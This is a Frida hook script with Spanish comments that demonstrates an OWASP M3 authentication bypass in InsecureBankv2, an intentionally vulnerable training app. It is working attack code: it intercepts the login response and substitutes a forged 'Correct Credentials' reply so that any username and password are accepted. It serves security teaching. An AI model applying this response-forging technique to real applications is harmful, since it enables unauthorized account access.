// hook-m3-bypass.js — Bypass de autenticación (OWASP M3) en InsecureBankv2
//
// POR QUÉ ESTE HOOK Y NO UNO DE "checkCredentials"
// ---------------------------------------------------
// InsecureBankv2 NO valida las credenciales en el cliente. Lo único que hace
// el cliente es enviar el POST y buscar la cadena "Correct Credentials" en la
// respuesta (DoLogin.java:114). No existe ningún método local de validación
// que hookear, y por eso los hooks "de login" habituales no tienen destino.
//
// El sitio donde se decide el resultado es, por tanto, el punto donde la
// respuesta del servidor se convierte en texto: convertStreamToString().
//
// QUÉ HACE ESTE SCRIPT
// --------------------
// 1. Imprime la respuesta REAL que devuelve el backend.
// 2. La sustituye por una respuesta inventada que contiene la cadena magic.
// Resultado: la app entra aunque las credenciales sean falsas, e incluso
// aunque el backend este apagado o devuelva un 404.
//
// Es el M3 demonstration en su forma mas pura: el cliente concede el acceso
// basandose solo en lo que dice el servidor, sin comprobar nada mas.
//
// USO
//   frida -U -f com.android.insecurebankv2 -l hook-m3-bypass.js
//
// En Frida 16+ la app se reanuda sola al cargar el script. El flag antiguo
// --no-pause ya NO existe (si se usa, el comando falla con
// "unrecognized arguments"); para dejar el proceso parado es --pause.

'use strict';

Java.perform(function () {
    var Log = console.log;

    Log('[*] Hook M3 instalado en DoLogin$RequestTask.convertStreamToString');

    var Task = Java.use('com.android.insecurebankv2.DoLogin$RequestTask');

    // Guardamos el metodo ORIGINAL antes de sustituirlo. Si no, llamarlo desde
    // dentro de la funcion sustituida entraria en recursion infinita.
    var original = Task.convertStreamToString.overload('java.io.InputStream');

    Task.convertStreamToString.implementation = function (inStream) {
        var real;
        try {
            real = original.call(this, inStream);
            Log('[MITM] Respuesta REAL del backend: ' + real);
        } catch (e) {
            Log('[MITM] No se pudo leer la respuesta real: ' + e);
            real = '';
        }

        var falsificada = '{"message": "Correct Credentials", "user": "inyectado-por-frida"}';
        Log('[MITM] Respuesta FORZADA:              ' + falsificada);
        Log('[MITM] La app acaba de aceptar un login que el backend NUNCA aprobo.');

        return falsificada;
    };

    Log('[*] Hecho. Haz login en la app con cualquier usuario y cualquier clave.');
});